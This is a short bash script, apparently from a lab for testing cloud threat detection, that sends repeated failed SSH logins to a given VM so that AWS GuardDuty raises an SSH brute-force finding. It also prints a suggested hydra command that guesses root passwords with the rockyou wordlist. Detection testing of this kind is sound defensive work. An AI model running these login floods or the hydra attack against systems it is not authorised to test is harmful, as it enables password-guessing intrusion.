#!/usr/bin/env bash
# ATTACK: brute-force SSH against the internet-exposed Mongo VM.
#
# DETECTED BY: GuardDuty finding UnauthorizedAccess:EC2/SSHBruteForce
#   (typically within ~10-15 minutes).
set -uo pipefail

TARGET="${1:?usage: 02_ssh_bruteforce.sh <vm-public-ip>}"
ATTEMPTS="${2:-80}"

echo "[*] Simulating $ATTEMPTS failed SSH logins against ${TARGET}:22 ..."
for i in $(seq 1 "$ATTEMPTS"); do
  ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "invaliduser${i}@${TARGET}" exit 2>/dev/null || true
done
echo "[i] For a stronger signal you can also run: hydra -l root -P rockyou.txt ssh://${TARGET}"
echo "[i] Check GuardDuty > Findings for SSHBruteForce."
